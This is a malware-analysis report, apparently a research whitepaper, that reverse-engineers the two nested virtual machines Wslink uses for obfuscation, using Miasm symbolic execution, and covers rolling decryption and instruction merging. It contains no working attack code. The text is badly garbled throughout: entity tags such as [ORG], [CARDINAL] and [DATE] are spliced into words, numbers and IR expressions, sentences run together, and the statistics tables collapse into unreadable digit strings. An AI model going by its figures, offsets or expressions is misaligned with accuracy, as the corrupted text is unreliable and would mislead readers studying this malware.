as:8\u2022 [PERSON] Switch [PERSON] Dispatch \u2013 the simplest dispatch mechanism where virtual instructions are defined as caseclauses and a virtual opcode is used as the test expression ( Figure [CARDINAL] 3)\u2022 Direct Call Threading \u2013 virtual instructions are defined as functions and virtual opcodes containaddresses of these functions\u2022 Direct Threading \u2013 virtual instructions are defined as functions again ; however , in comparisonto [FAC] Direct [FAC] Call [FAC] Threading , addresses of the functions are stored in a table and virtual opcodes represent offsets to this table Each function should indirectly call the following one according to the specification ( Figure 4)The body of a virtual opcode in the interpreter \u2019s code is usually called a virtual handler because it defines the behavior of the opcode and handles it when the virtual program counter points to a location in the bytecode that contains a virtual instruction with that opcodeBy context , regarding VMs , we mean a sort of virtual process context : each time a process is removed from access to the processor during process switching , sufficient information on its current operating state \u2013 its context \u2013 must be stored such that when it is again scheduled to run on the processor , it can resume its operation from an identical positionFigure 3 Illustration of [ORG] Switch [ORG] Dispatch , where [GPE] R0 is a virtual register9Figure [CARDINAL] 4 . Illustration of Direct ThreadingObfuscation techniques are a kind of software protection intended to make code hard to understand and hence conceal its objectives Such techniques were initially developed to protect the intellectual property of legitimate software , i e , to hamper reverse engineeringVirtual machines used as obfuscation engines are based on process virtual machines , as described above The primary difference is that they are not intended to run cross - platform applications and they usually take machine code compiled or assembled for a known [ORG] ISA , disassemble it and translate that to their own virtual [ORG] ISA It is also usually the case that the VM environment and the virtualized application code are contained in one application , whereas traditional process VMs usually consist of a process that runs as a standalone application that loads separate , virtualized applicationsThe strength of this obfuscation technique resides in the fact that the [ORG] ISA of the VM is unknown to any prospective reverse engineer \u2013 a thorough analysis of the VM , which can be very time - consuming , is required to understand the meaning of the virtual instructions and other structures of the VM Further , if performance is not an issue , [ORG] the [ORG] VM [ORG] \u2019s [ORG] ISA can be designed to be arbitrarily complex , slowing its execution of virtualized applications , but making reverse engineering even more complex Understanding of the VM is necessary for decoding the bytecode and making the virtualized code understandableContext has a bit of a different meaning in regard to obfuscating virtual machines : each time we want to switch from the native to virtual [ORG] ISA or vice - versa , sufficient information \u2013 context \u2013 on the current operating state must be stored so that when the lSA has to be switched back , execution can resume with only the relevant data and registers modifiedAdditionally , obfuscating VMs usually virtualize only certain \u201c interesting \u201d functions \u2013 native context is mapped to the virtual one and bytecode , representing the respective function , is chosen beforehand The built - in interpreter is invoked afterwards ( Figure [CARDINAL] 5 ) Beginnings of the original functions contain code that prepares and executes the interpreter \u2013 entry of the VM ( vm_entry ) ; the rest of their code is omitted in Figure [CARDINAL] 5Interpreter , bytecode , and virtual [ORG] ISA code with data of obfuscating VMs are often all stored in a dedicated section of the executable binary , along with the rest of the partially virtualized program10Figure [CARDINAL] 5 shows the way a function , [PRODUCT] Function [PRODUCT] 1 , in the original application targeting a common [ORG] ISA can be virtualized for an obfuscating VM \u2019s [ORG] ISA It needs to be converted into bytecode , for example using a generate_bytecode method Its body is afterwards overwritten by a call into vm_entry and zeroes The vm_entry function chooses the respective bytecode , for example , based on the calling function \u2019s address , then conducts a context switch , and next interprets the bytecode Finally , it returns to the code where the virtualized function , Function 1 , would returnFigure [CARDINAL] 5 . Overview of the virtualization processIn [PERSON] VMs hosted on x86 architectures , such context switches usually consist of a series of [ORG] PUSH and [ORG] POP instructions For example : PUSH EAXPUSH EBXPUSH [ORG] ECX [ORG] MOV [ORG] ECX , context_addrPOP DWORD [ORG] PTR [ ECX]POP DWORD [ORG] PTR [ [ORG] ECX + 4]POP DWORD [ORG] PTR [ [ORG] ECX + 8 ] When the bytecode is fully processed , virtual context is mapped back to native context and execution continues in the non - virtualized code ; however , another virtualized function could be executed in the same manner , right awayNote that several context switches can occur in [CARDINAL] one virtualized function , for example when a native instruction from the original [ORG] ISA could not be translated to virtual instructions or an unknown function from the native API needs to be executed11Documented techniques for deobfuscation of virtual machines [ORG] Obfuscating [ORG] VM techniques have become widely misused for illicit purposes such as obfuscation of malware samples as they hinder both analysis and detection Hence there is motivation to overcome these obfuscation techniques so as to facilitate analysis of such malicious code and to achieve overall improvement of detection methodsBut [ORDINAL] first , we want to clarify several terms that are used in this and following sections and might not be known to all readersSymbolic execution is a code analysis technique , where specific variables are represented with symbolic values instead of concrete data [CARDINAL] Arbitrary operations with these symbolic values produce symbolic expressions It is usually applied on the code \u2019s IR and the symbolic expressions include flagsOne can visualize the symbolic expressions like mathematical formulas as can be seen in the following example , where irb1 contains a block of pseudo - IR : irb1 : [CARDINAL] R13 = [ORG] R13 + 0x027D3930RBX = RCX + 0x05R13 = R13 + -RSIR13 = R13 + RBXirb1_symb : [ORG] RBX = RCX + 0x05R13 = R13 + [ORG] RCX + 0x05 + -RSI + 0x027D3930ZF = R13 + [ORG] RCX + 0x05 + -RSI + 0x027D3930 = = [CARDINAL] 0x00 The state of symbolically executed code consists of:\u2022 Values of all variables \u2022 [ORG] Program counter \u2022 Accumulated constraints that the program \u2019s inputs need to satisfy to reach the associated location from theentry pointAccumulated constraints can be understood as a theory in logic In order to find concrete values of the initial variables with symbolic values \u2013 inputs \u2013 we need to find a satisfying model , which can be done with an [ORG] SMT ( satisfiability modulo theories ) solverPath coverage is another code analysis technique that determines all possible paths in a piece of code It is usually implemented using symbolic execution instructed to explore all reachable paths \u2013 reachability of newly discovered paths is verified by an [ORG] SMT solver and already known paths are marked to prevent infinite loopsMicrosoft describes program synthesis as \u201c the task of automatically discovering an executable piece of code given user intent expressed using various forms of constraints such as input - output examples , demonstrations , natural language , etc \u201d Several techniques to deal with VM - based obfuscation have been proposed in the past Here we briefly walk through them and discuss their advantages and disadvantages12Rolf Rolles described several standard steps to manually recover the original code , where the drawback is time - complexity:1 . Reverse engineer and understand structures of the VM [CARDINAL] 2 . Detect entries into the VM [CARDINAL] 3 . Develop a disassembler for the instruction set by identifying the purpose of individual virtual opcodes ormatching them against already known ones4 . Disassemble the bytecode and convert it into intermediate representation \u2013 the semantics of someinstructions might be hard to comprehend in basic blocks without further translation ( e g , stack - based VMs would contain a lot of confusing [ORG] PUSH and [ORG] POP machinations\u201d)5 . Apply compiler optimizations to get rid of additional obfuscation techniques [CARDINAL] 6 . Generate the deobfuscated codeHe additionally suggested the use of pure symbolic execution on the virtual opcodes in the [ORDINAL] fourth step to obtain a representation , where each opcode is a mathematical function that is a map from its input space into itself The pure symbolic execution technique was later independently implemented in a [ORG] Miasm blogpostJonathan [GPE] Salwan , [PERSON] S\u00e9bastien [PERSON] Bardin , and Marie - Laure [ORG] Potet proposed a fully automatic approach to overcome obfuscating VM protection on samples with a finite number of executable paths The approach consists of the following steps:1 . Identification of the sample \u2019s inputs [CARDINAL] 2 . Isolation of pertinent instructions dependent on the identified inputs on an execution trace [CARDINAL] 3 . Performance of a path coverage analysis to reach new paths \u2013 traces [CARDINAL] 4 . Reconstruction of the original program from the resulting traces \u2013 they are combined and compileroptimizations partially recover the control flow graphTim [PERSON] Blazytko , [PERSON] Moritz [PERSON] Contag , Cornelius Aschermann , and [PERSON] Thorsten [PERSON] Hol produced a semiautomatic approach , based on program synthesis , that uses instruction traces as a black - box oracle to produce random input and output pairs The I / O pairs are subsequently used to learn the code \u2019s underlying semantics with the [NORP] synthesizerThese pairs and semantics are generated for the virtual opcodes that must be identified beforehand \u2013 the VM needs to be partially reverse engineered to locate its componentsThe approach does not seem to be applicable to some complex ( particularly obfuscating ) VMs due to its time complexity , as it reportedly took [TIME] almost [TIME] three [TIME] hours to process [CARDINAL] 36 virtual opcodes of a VM \u2013 duplication of handlers , which is a simple and common obfuscation technique , would be a huge issueThe [ORG] Miasm framework [ORG] Miasm is a free and open - source reverse - engineering framework that aims to analyze , modify and generate binary programs It has a number of useful features that we use throughout our analysis:\u2022 [WORK_OF_ART] Opening , modifying and generating binary files \u2013 [ORG] PE and ELF \u2022 Assembling and disassembling of various architectures such as x86 , ARM , [ORG] MIPS \u2026 \u2022 Representing assembly semantics using intermediate representation \u2022 Simplification rules for automatic deobfuscation \u2022 Symbolic execution engine \u2022There are several frameworks for reverse - engineering that provide the features that we needed ; we decided to use [ORG] Miasm in this project simply because it is actively maintained , and we are already familiar and satisfied with it13The features that we want to use are covered in the example section of its [ORG] GitHub repository description and its documentationWe encourage the reader to get familiar at least with semantics of its [ORG] IR that are summarized in [LAW] Table [LAW] 1 , since they are going to be used repeatedlyElement A ? B : C AH = EAX[8:16 ] { EAX [DATE] 0 [DATE] 32 , 0x0 [CARDINAL] 32 64}Table [CARDINAL] 1 . [ORG] Miasm [ORG] \u2019s IR semanticsThe destination address of a symbolic execution performed over a block of code is saved in the respective program counter such as [ORG] RIP and additionally in a special variable IRDstNote that during [ORG] Miasm [ORG] \u2019s symbolic execution : initial values of registers , which are treated as variables , are symbolic and their format is < register name>_init Simplification rules are applied automatically to the symbolic expressions For example , the symbolic expression [ORG] RAX = [PRODUCT] RCX [PRODUCT] + [PRODUCT] 0x2 [PRODUCT] + [PRODUCT] 0x3 is automatically simplified into [ORG] RAX = RCX_init + [DATE] 0x5WSLINK \u2019S VIRTUAL MACHINE ENTRY \u2013 VM_ENTRY Let [NORP] \u2019s get to the analysis of [ORG] Wslink [ORG] \u2019s [ORG] VM now There are several function calls that enter the VM , all of which are followed by some gibberish data that [ORG] IDA attempts to disassemble \u2013 the data most likely just overwrites the function \u2019s original code before virtualization ( Figure [CARDINAL] 6)Figure [CARDINAL] 6 Entry point to the virtual machine14The vm_entry of the VM : \u2022 calculates the actual base address by subtracting the expected relative virtual address from the actualvirtual address of a place in the code\u2022 unpacks code and data related to the VM on the [ORDINAL] first run ; it uses the calculated base address todetermine the location of the packed VM and destination of the unpacked data\u2022 executes an initialization function \u2013 one of the vm_pre_init ( ) functions to be described is based onthe caller \u2019s relative address that is mapped to the respective vm_pre_init()PACKER Wslink \u2019s VM is packed with [PERSON] NsPack to reduce the size of the huge executable file ; additional obfuscation is probably just a side effect [ORG] Similarities between Wslink \u2019s unpacking code and ClamAV [ORG] \u2019s unspack ( ) function are clearly visible ( Figure [CARDINAL] 7 and Figure 8) Note that [PERSON] Ghidra has optimized out calculation of the base addressFigure [CARDINAL] 7 A part of vm_entry of the virtual machine decompiled with Ghidra15Figure [CARDINAL] 8 Function used to unpack [PERSON] NsPack in [GPE] ClamAVThe vm_pre_init_dispatch_table in Figure [CARDINAL] 7 is the structure that maps callers \u2019 addresses of the vm _ entry to the respective vm_pre_init ( ) functions that are to be described16JUNK CODE Each part of the unpacked VM is obfuscated with lots of junk code \u2013 unnecessary additional instructions significantly decreasing readability of the code It often uses instruction pairs with opposite effectsNeither the [ORG] IDA nor the [PERSON] Ghidra decompiler is able to deal with such obfuscation ; however , [ORG] Miasm [ORG] \u2019s symbolic execution was able to make the code easily readable ( Figure [CARDINAL] 9)Figure [CARDINAL] 9 A block of code in [ORG] Miasm [ORG] \u2019s symbolic execution ( left ) and a part of the same block in [ORG] IDA [ORG] \u2019s decompiler ( [ORG] right)17VIRTUAL [ORG] MACHINE [ORG] INITIALIZATION [ORG] Initialization of the VM consists of several steps , such as saving values of the native registers on the stack and later moving them to the virtual context , relocation of its internal structures , or preparation of bytecode We cover these steps more thoroughly in the following subsectionsvm_pre_init ( ) functions vm_pre_init ( ) functions are meant only to prepare parameters for another stage of initialization ( Figure [CARDINAL] 10 ) These functions call a single vm_init ( ) function ( explained in the next section ) with specific parameters The supplied parameters are:\u2022 CPU flags , RFLAGS , which are stored on the stack with a PUSHF instruction at the beginning of eachfunction\u2022 hardcoded offset to a virtual instruction table that represents the [ORDINAL] first virtual instruction to beexecuted ( its opcode)\u2022 hardcoded address of the bytecode to be interpretedFigure [CARDINAL] 10 [ORG] Miasm [ORG] \u2019s symbolic execution of a vm_pre_init ( ) showing parameters supplied to vm_init()18vm_init ( ) function [PERSON] vm_init ( ) pushes all the native registers and the supplied CPU flags from parameters ( context ) onto the stack ; one can actually see it in Figure [CARDINAL] 9 The native context will later be moved to the virtual one that , in addition , holds several internal registersOne of the internal registers determines whether another instance of the VM is already running \u2013 there is [CARDINAL] only [CARDINAL] one global virtual context and [CARDINAL] only [CARDINAL] one instance of the VM can run at a time Figure [CARDINAL] 11 shows the part of the code busy - waiting for the virtual register , where [ORG] RBP contains the address of the virtual context and [ORG] RBX the offset of the virtual register \u2013 the internal register is stored in [ RBX + RBP]The entire function is summarized in Figure [DATE] 12Figure [DATE] 11 Busy - waiting for interpreter in [GPE] vm_init()The bytecode \u2019s address , supplied in the parameters , is added to the virtual context along with the address of the virtual instruction table , which is hardcoded Both have a dedicated virtual registerThe VM calculates the base address again in the same way as was described for vm_entry ; in addition , it stores the address in another internal register that is used later , should an API be called Then the base address is used to relocate the instruction table , its entries , and the bytecode \u2019s addressThe calculated base address is simply added to all the function addresses if they have not already been relocated19Figure [CARDINAL] 12 vm_init ( ) summary20VIRTUAL INSTRUCTIONS There are [CARDINAL] only [CARDINAL] 45 instructions in the virtual instruction table ( Figure 13)Figure 13 [GPE] Virtual instruction tableLet us look at the [ORDINAL] first one in the table Initially , we need to relocate it ; our dump of the VM starts at address [CARDINAL] 0x00 and it is expected to be at base + 0x0F33F5 , so the target address is 0x1EC74E \u2013 0x0F33F5 , which is 0x0F9359 ( Figure [CARDINAL] 14)Figure 14 The [ORDINAL] first virtual instruction in the tableThe JMP in Figure [CARDINAL] 14 leads us to a function at [CARDINAL] 0x0FF2DB whose behavior is remarkably similar to vm_pre_init ( ) ( Figure [CARDINAL] 15 and Figure [CARDINAL] 16 for comparison ) The function appears to be pushing another bytecode address , the opcode of the initial virtual instruction , and CPU flags21Figure [CARDINAL] 15 One of the vm_pre_init ( ) functionsFigure [CARDINAL] 16 [ORG] Miasm [ORG] \u2019s symbolic execution of the [ORDINAL] first virtual instruction ( function at 0x0FF2DB)Inspecting the function at 0x0F7FFF ( Figure [CARDINAL] 17 ) , into which our virtual instruction jumps , reveals that it appears to be another [PERSON] vm_init ( ) ( Figure [CARDINAL] 18 ) When we compare it to the previous one , we can see that their behaviors are , indeed , the same We will refer to these functions simply as vm2_pre_init ( ) and vm2_init()22Figure [CARDINAL] 17 [ORG] Miasm [ORG] \u2019s symbolic execution of the [ORDINAL] first block of vm2_init()23Figure [CARDINAL] 18 [ORG] Miasm [ORG] \u2019s symbolic execution of the [ORDINAL] first block of vm_init()Inspection of the other instructions revealed that they all execute this [ORDINAL] second VM with different vm2 _ pre_init ( ) functions \u2013 this clearly shows that there are [CARDINAL] two layers of [CARDINAL] VMsVirtual instructions of the [ORDINAL] first VM execute vm2_pre_init ( ) directly without any dispatch table based on the caller \u2019s address The number of virtual instructions in the [ORDINAL] second VM is significantly higher \u2013 [DATE] 1071 ( Figure [DATE] 19)Figure [DATE] 19 A part of the [ORDINAL] second virtual instruction table24Virtual instructions of the [ORDINAL] second virtual machine We start by looking at the [ORDINAL] first few executed virtual instructions to observe the behavior of the [ORDINAL] second VM and then try to process the rest of them in a partially automated wayThe diagram in Figure [CARDINAL] 20 highlights with blue , where the virtual instructions of the [ORDINAL] second VM are in the structure of the VMsFigure [CARDINAL] 20 [GPE] Virtual instructions in the structure of the virtual machinesThe [ORDINAL] first virtual instruction The [ORDINAL] first virtual instruction is , exceptionally , not obfuscated , as can be seen in Figure [CARDINAL] 21 Finally , we can see some operations in the virtual contextBy inspecting the modified memory and calculated destination address of the instruction , it is clear that the instruction does [CARDINAL] three things:1 . Zeroes out a virtual [QUANTITY] 32 - bit register at offset 0xB5 in the virtual context ( highlighted in gray in Figure [CARDINAL] 21),which is stored in the RBP register2 . A virtual [CARDINAL] 64 - bit register at offset 0x28 is increased by [CARDINAL] 0x04 : it is the pointer to the bytecode \u2013 virtual program counter The size of the virtual instruction is hence [CARDINAL] four bytes ( highlighted in red in Figure [CARDINAL] 21)3 . The next virtual instruction is prepared to be executed , the offset to the virtual instruction table \u2013 virtualopcode \u2013 is fetched from the virtual program counter The virtual instruction table is at offset 0xA4 ( highlighted in green in Figure [CARDINAL] 21 ) This means that the VM uses [ORG] the [ORG] Direct [ORG] Threading [ORG] Dispatch technique25Figure [CARDINAL] 21 The initial virtual instruction of the [ORDINAL] second VMNote that the size of the next instruction \u2019s opcode is [CARDINAL] only [CARDINAL] two bytes and the remaining word is left unused We can see that it is just a [CARDINAL] zero when we look at virtual operands ( Figure [CARDINAL] 22 ) Sizes of the other instructions differ \u2013 it is not just padding that preserves the same size for all instructionsFigure [CARDINAL] 22 [PERSON] Bytecode of the virtual instructionThe [ORDINAL] second virtual instruction The [ORDINAL] second virtual instruction does not do anything special ; it just zeroes out several virtual registers and jumps to the next instruction ( Figure [CARDINAL] 23)Figure [CARDINAL] 23 Destination address and memory modified by the [ORDINAL] second virtual instructionThe [ORDINAL] third virtual instruction The [ORDINAL] third virtual instruction stores the address of the stack pointer in a virtual register ( Figure [CARDINAL] 24 ) ; the offset of the register is determined by [CARDINAL] one of the operands , and its offset is 0x0141 in our caseFigure [CARDINAL] 24 Destination address and memory modified by the [ORDINAL] third virtual instruction26The [ORDINAL] fourth virtual instruction The [ORDINAL] fourth instruction contains [CARDINAL] two immediately visible anomalies in comparison with previous instructions \u2013 the stack pointer \u2019s delta is lower at the end of the function and it contains a conditional branch ( Figure [CARDINAL] 25)Figure 25 The conditional branch and delta of the stack pointer of the [ORDINAL] fourth virtual instructionSymbolic execution of the [ORDINAL] first block reveals that a value is popped from the stack into a virtual register ( Figure [CARDINAL] 26 ) , which makes sense as the values of the native registers remain on the stack after being saved there by vm2_init ( ) They are now being moved to the virtual context \u2013 the context switch is partially performed by a number of virtual instructions , each of which pops [CARDINAL] one value off the stack into a different registerFigure [CARDINAL] 26 Destination address and memory modified by the [ORDINAL] fourth virtual instructionThe virtual register , where the value of the native register is to be saved , is determined by an operand and [CARDINAL] two other virtual registers at offsets [CARDINAL] 0x0B and 0x70 However , their initial value is already known : they were set to [CARDINAL] zero by the [ORDINAL] second virtual instruction ( Figure [CARDINAL] 23 ) , which means that we can calculate the offset of the register and simplify the expressions \u2013 they are used just to obfuscate the code27Rolling decryptionAnalysis of other virtual instructions confirmed that the virtual registers at offsets [CARDINAL] 0x0B and [CARDINAL] 0x70 are meant just to encode operands This technique is called rolling decryption and it is known to be used by the [ORG] VMProtect obfuscator However , it is the only overlap with that obfuscator and we are highly confident that this VM is differentThe obfuscation technique is certainly one of the reasons for the enormous number of virtual instructions \u2013 use of the technique requires duplication of individual instructions since each uses a different key to decode the operandsSimplificationThe expressions can be simplified to the following when we apply the known values of the virtual registers : [ORG] IRDst = ( -@16[@64[RBP_init + 0x28 ] + 0x4 ] ^ 0x3038 = = @16[@64[RBP_init + 0x28 ] + 0x6])?(0x7FEC91ABD1C,0x7FEC91ABCF6)@64[RBP_init + { -@16[@64[RBP_init + 0x28 ] + 0x4 ] ^ 0x3038 , [DATE] 0 , [DATE] 16 , [GPE] 0x0 , [DATE] 16 , [CARDINAL] 64 } ] = @64[RSP_init]Now let us take a look at the expression in the conditional block:@64[RBP_init + { @16[@64[RBP_init + 0x28 ] + 0x6 ] , [DATE] 0 , [DATE] 16 , [GPE] 0x0 , [DATE] 16 , [CARDINAL] 64 } ] = @64[RBP _ init + { @16[@64[RBP_init + 0x28 ] + 0x6 ] , [DATE] 0 , [DATE] 16 , [GPE] 0x0 , [DATE] 16 , [DATE] 64 } ] + 0x8We can now see that the virtual instruction is definitely [ORG] POP \u2013 it moves a value off the top of the stack to a virtual register , whose offset is still obfuscated with a simple [WORK_OF_ART] XOR ; it additionally increases the stack pointer when the destination register is not the stack pointerAs values in the bytecode are known too , we can apply them and simplify the instruction even further into the following final unconditional expressions : [ORG] IRDst = @64[@64[RBP_init + 0xA4 ] + 0x5A8]@64[RBP_init + 0x28 ] = @64[RBP_init + 0x28 ] + 0x8@64[RBP_init + 0x141 ] = @64[RBP_init + 0x141 ] + 0x8@64[RBP_init + 0x12A ] = @64[RSP_init]Automating analysis of the virtual instructions As doing this for [CARDINAL] more [CARDINAL] than [CARDINAL] 1000 instructions would be very time consuming , we wrote a Python script with [ORG] Miasm that collects this information for us so we can get a better overview of what is going on We are particularly interested in modified memory and destination addressesJust as in the [ORDINAL] fourth virtual instruction , we will treat certain virtual registers as concrete values to retrieve clear expressions These registers are dedicated to the rolling decryption and perform memory accesses that are relative to the bytecode pointer , e g [ < obf_reg_1 > ] = [ < bytecode_ptr > + 0x05 ] ^ 0xABCDSubsequently we concretize the pointer to the virtual instruction table too and , by the end of the virtual instruction : calculate addresses of the next ones , clear the symbolic state , and start with the following virtual instructionsWe additionally save aside memory assignments that are not related to the internal registers of the VM and gradually build a graph based on the virtual program counter ( Figure 27)28Figure 27 Call graph generated from memory assignments and the VPCWe stop when we can not unambiguously determine the next virtual instructions to be executed ; one can automatically process most of the virtual instructions in this wayNote that instructions featuring complex loops can not be processed with certainty and need to be addressed individually due to the path explosion problem of symbolic execution , which is described for example in the paper Demand - Driven [ORG] Compositional [ORG] Symbolic Execution : \u201c Systematically executing symbolically all feasible program paths does not scale to large programs Indeed , the number of feasible paths can be exponential in the program size , or even infinite in presence of loops with unbounded number of iterations \u201d 29Getting back to the [ORDINAL] first virtual machine Before diving into the virtual instructions of the [ORDINAL] first VM , let us recap where we currently are We have just described a way to semiautomate processing of the bytecode belonging to the [ORDINAL] second VM ( blue in Figure [CARDINAL] 28 ) that interprets virtual instructions of the [ORDINAL] first VM ( red in Figure [CARDINAL] 28 ) Now we move on to inspect instructions of the [ORDINAL] first VM with this approachFigure [CARDINAL] 28 [GPE] Virtual instructions in the structure of the virtual machines30The initial virtual instruction In this section we describe the results of processing of the initial virtual instruction of the [ORDINAL] first VM in the semiautomatic manner that was described in the previous sectionWe performed all the processing on a virtual machine with i7 - 4770 CPU and 4 GB of memory Statistics in Table 2 have been extracted from the processing of the initial virtual instructionSize of the bytecode block in bytesTotal number of processed virtual instructionsTotal number of underlying native instructions1,14510917,406Total number of resulting [ORG] IR instructions ( including IRDsts)307Execution time in seconds10 6509Table 2 Statistics of the initial virtual instructionThe resulting control flow graph built out of the semantics extracted from the virtual instructions of the [ORDINAL] second VM \u2019s bytecode that interprets the initial virtual instruction from the [ORDINAL] first VM can be seen in Figure [CARDINAL] 29 We can divide the series into a few partsFigure [CARDINAL] 29 Control flow graph of the initial virtual instruction31Intro As expected , the graph starts with a series of [ORG] POP instructions that move values of the native registers saved beforehand in vm2_init ( ) to the virtual ones ( Figure [CARDINAL] 30 ) To determine positions of the native registers on the stack , we could symbolically evaluate the [ORDINAL] first block of vm2_init ( ) and map the virtual registers to their native versions , which would make the code easier to read , but that is not important nowRemember that the virtual register at offset [CARDINAL] 0x1E contains the stack pointer , and that a [ORG] POP instruction moves a value off the top of the stack and usually increases the stack pointerFigure [CARDINAL] 30 Beginning of the intro finishing context switch of the [ORDINAL] second VM32Outro To map the virtual registers back to the native ones , the [ORDINAL] second VM pushes them all onto the stack and then subsequently pops them off [CARDINAL] one by one to the native ones Note that we set up an exclusion in our algorithm and disabled optimizations to show assignments to registers in the last virtual instruction ( Figure [DATE] 31)Figure [DATE] 31 [GPE] Virtual registers of the [ORDINAL] second machine being mapped back to the native ones at the end of the virtualinstruction33Analysis of the virtual context In this section we analyze the behavior of the [ORDINAL] first VM based on the results of the The [ORDINAL] first virtual instruction sectionFigure [CARDINAL] 32 shows:\u2022 virtual registers being pushed onto the stack at the beginning of the outro ( red ) \u2022 partially the way the next virtual instruction is prepared to be executed ( green ) \u2022 the virtual program counter being increased ( blue)In particular , the virtual program counter is represented by @64[@64[RBP_init + 0x38 ] + 0x2C ] , where the register at @64[RBP_init + 0x38 ] holds the address of the virtual context We can see that size of the initial virtual instruction was 8 bytes , since the virtual program counter is increased by [CARDINAL] 8 in the line highlighted with blue in Figure [CARDINAL] 32Figure [CARDINAL] 32 Last few virtual instructions executed before mapping the virtual registers back to the native onesAs one can see in Figure [CARDINAL] 31 ( [ORG] IRDst = @64[RBP_init + 0x74 ] ) , the virtual register at offset 0x74 determines [ORG] IRDst \u2013 the address of the next instruction If we follow the virtual register @64[RBP_init + 0x74 ] in Figure [CARDINAL] 32 , we can see that it appears to be preparing to execute the next virtual instruction similarly to the [ORDINAL] second VM Its code slice is the following series of expressions:@64[RBP_init + 0x30 ] = @64[@64[RBP_init + 0x38 ] + 0x2C]@64[RBP_init + 0x30 ] = @64[RBP_init + 0x30 ] + 0x2@64[RBP_init + 0x30 ] = { @16[@64[RBP_init + 0x30 ] ] 0 16 , 0x0 [CARDINAL] 16 64}34@32[RBP_init + 0x30 ] = @32[RBP_init + 0x30 ] + 0x8E839329@64[RBP_init + 0x30 ] = @64[RBP_init + 0x30 ] & 0xFFFF@64[RBP_init + 0x30 ] = @64[RBP_init + 0x30 ] < < 0x3@64[RBP_init + 0xDE ] = @64[@64[RBP_init + 0x38 ] + 0xEE]@64[RBP_init + 0xDE ] = @64[RBP_init + 0x30 ] + @64[RBP_init + 0xDE]@64[RBP_init + 0x74 ] = @64[@64[RBP_init + 0xDE]]The entire slice of @64[RBP_init + 0x30 ] is meant just to acquire the offset of the next virtual instruction ( opcode ): it gets the virtual instruction \u2019s offset from the bytecode whose pointer is stored in the @64[@64[RBP_init + 0x38 ] + 0x2C ] register , and the offset is subsequently increased by [CARDINAL] 0x8E839329 \u2026 which could have been omitted and serves solely to obscure the virtual instructionThe virtual register @64[@64[RBP_init + 0x38 ] + 0xEE ] contains the address of the virtual instruction table Now it is clear that the [ORDINAL] first VM is obfuscated using known values from the bytecode too and that the code indeed executes a next virtual instruction as well \u2013 it definitely uses [PRODUCT] Direct [PRODUCT] ThreadingOne can additionally see that @64[RBP_init + 0x50 ] stores the RFLAGS in Figure [CARDINAL] 32Behavior The virtual instruction behaves similarly to the virtual instructions from the [ORDINAL] second VM \u2013 offsets of the virtual registers to be used are fetched from the virtual instruction \u2019s operandsSubsequently a virtual register \u2019s value is moved to a memory address stored in another one : [ < virt _ reg_1 > ] = < virt_reg_2 > The target register is then either increased or decreased by [CARDINAL] 8 : < virt _ reg_1 > = < virt_reg_1 > + - 8 This is most likely a [ORG] PUSH instruction prepared also for environments where the stack grows upwardsInitially executed virtual instructions We will have a look at a few other virtual instructions to confirm our findings and the correctness of methods for analysis of the first VM Specifically , the virtual instructions that are initially executed as we can compare the [ORDINAL] first VM \u2019s initial behavior to the [ORDINAL] second VM\u2019sThe [ORDINAL] first executed virtual instruction We can see in the highlighted line of Figure [CARDINAL] 33 that the [ORDINAL] first executed instruction of the [ORDINAL] first VM behaves indeed just like the one in the [ORDINAL] second VM \u2013 it just zeroes out an internal register and prepares another virtual instruction to be executed35Figure [CARDINAL] 33 Zeroing out an internal register36Statistics in [LAW] Table [LAW] 3 have been extracted from the processing of the [ORDINAL] first executed virtual instructionSize of the bytecode block in bytesTotal number of processed virtual instructionsTotal number of underlying native instructionsTotal number of resulting [ORG] IR instructions ( including IRDsts)Execution time in seconds548629,4441956 4810Table 3 Statistics of the [ORDINAL] first executed virtual instructionThe [ORDINAL] second executed virtual instruction The [ORDINAL] second virtual instruction just zeroes out several internal registers , which are most likely about to be used for obfuscation , as in the [ORDINAL] second [ORG] VMStatistics in [DATE] Table [DATE] 4 have been extracted from the processing of the [ORDINAL] second executed virtual instructionSize of the bytecode block in bytesTotal number of processed virtual instructionsTotal number of underlying native instructionsTotal number of resulting [ORG] IR instructions ( including IRDsts)Execution time in seconds7558313,7402597 7718Table 4 Statistics of the [ORDINAL] second executed virtual instructionThe [ORDINAL] third executed virtual instruction The [ORDINAL] third virtual instruction behaves just like the [ORDINAL] third one of the [ORDINAL] second VM too \u2013 it stores the stack pointer ( highlighted in Figure [CARDINAL] 34 ) The addition of [CARDINAL] 0x98 is present due to applied optimizations which took into account the previously executed [ORG] POP instructions in the [LOC] Intro section37Figure [CARDINAL] 34 Storing the stack pointer in an internal registerStatistics in [LAW] Table [LAW] 5 have been extracted from the processing of the [ORDINAL] third executed virtual instructionSize of the bytecode block in bytesTotal number of processed virtual instructionsTotal number of underlying native instructions5866610,263Total number of resulting [ORG] IR instructions ( including IRDsts)207Execution time in seconds6 8428Table 5 Statistics of the [ORDINAL] third executed virtual instruction38The [ORDINAL] fourth executed virtual instruction We naturally expect this instruction to be a [ORG] POP as in the [ORDINAL] second VM ; however , it is hard to confirm statically as the already described obfuscation techniques make it too hard to understand One can see part of the virtual instruction in Figure [CARDINAL] 35Statistics in [LAW] Table [LAW] 6 have been extracted from the processing of the [ORDINAL] fourth executed virtual instructionSize of the bytecode block in bytesTotal number of processed virtual instructionsTotal number of underlying native instructions4,88342571,192Total number of resulting [ORG] IR instructions ( including IRDsts)1,038Execution time in [DATE] seconds28 [DATE] 1638Table [DATE] 6 [DATE] Statistics of the [ORDINAL] fourth executed virtual instructionFigure [CARDINAL] 35 Part of the [ORDINAL] fourth virtual instructionWhen we look closely at certain parts of Figure [CARDINAL] 35 , it appears to be able to behave as a [ORG] POP instruction The part of the virtual instruction in Figure [CARDINAL] 36 clearly behaves just like the [ORDINAL] fourth one of the [ORDINAL] second VM \u2013 it moves a value off the top of the stack , and if the target register is different from the stack pointer , the stack pointer is increasedFigure [CARDINAL] 36 Part of the [ORDINAL] fourth virtual instruction performing a pop - like operation39Instruction mergingHowever , the instruction also seems to be capable of performing a [ORG] PUSH and other operations as well , based on the operands ( Figure [CARDINAL] 37 ) , which means that it consists of several other instructions merged into one , which is a kind of obfuscation technique It most likely merged several instructions with different rolling keys into oneFigure [CARDINAL] 37 Part of the [ORDINAL] fourth virtual instruction performing a PUSH operationAUTOMATING ANALYSIS OF [ORG] THE [ORG] FIRST [ORG] VIRTUAL [ORG] MACHINE Now that we know what the internal structure of the [ORDINAL] first VM is like , we can process the VM as the [ORDINAL] second [CARDINAL] one since analyzing all the virtual instructions would be complicated due to the additional obfuscation techniques \u2013 we can again effectively eliminate them with symbolic executionWe definitely need to concretize the virtual instruction table and internal registers dedicated for obfuscation as in the previous one 